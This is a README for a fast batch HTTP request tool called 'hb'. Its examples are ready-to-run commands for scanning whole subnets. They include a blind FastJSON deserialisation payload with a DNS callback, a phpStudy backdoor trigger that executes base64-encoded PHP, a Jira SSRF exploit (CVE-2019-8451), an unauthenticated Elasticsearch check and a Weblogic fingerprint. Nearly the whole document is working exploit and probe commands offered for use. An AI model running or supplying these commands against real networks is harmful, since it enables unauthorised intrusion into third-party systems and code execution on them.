# hb
> Fast http batch request tool 

## Example 

### Add HTTP Header
```bash
./hb -host 192.168.1.1/24 -H "Host: bypasscdn"
```

### FastJSON Blind
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -H "Content-Type: application/json" -body '{"@type": "java.net.InetAddress", "val":"{hostname}.dnslog"}' -replace -redirect
```

### Weblogic fingerprint
```bash
./hb -host 192.168.1.1/24 -host 127.0.0.1 -p 80,443,7001 -H "Authorization: Basic" -code 401
```

### Elasticsearch Unauthorized
```bash
./hb -host 192.168.1.1/24 -host 127.0.0.1 -p 9200 -path "/_cat" -grep "/_cat/allocation"
```

### phpStudy Backdoor
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -H "Accept-Charset: cGhwaW5mbygpOwo=" -H "Accept-Encoding: gzip,deflate" -regexp '<tr><td class="e">disable_functions</td><td class="v">(.*?)</td>' -redirect
```

### CVE-2019-8451 Jira SSRF
```bash
./hb -host 192.168.1.1/24 -p 80,443,8080 -path "/plugins/servlet/gadgets/makeRequest?url={{scheme}}://{{host}}@baidu.com/" -H "X-Atlassian-Token: no-check" -replace -grep "www.baidu.com" -regexp '<meta name="ajs-version-number" content="(.*?)">' -redirect
```


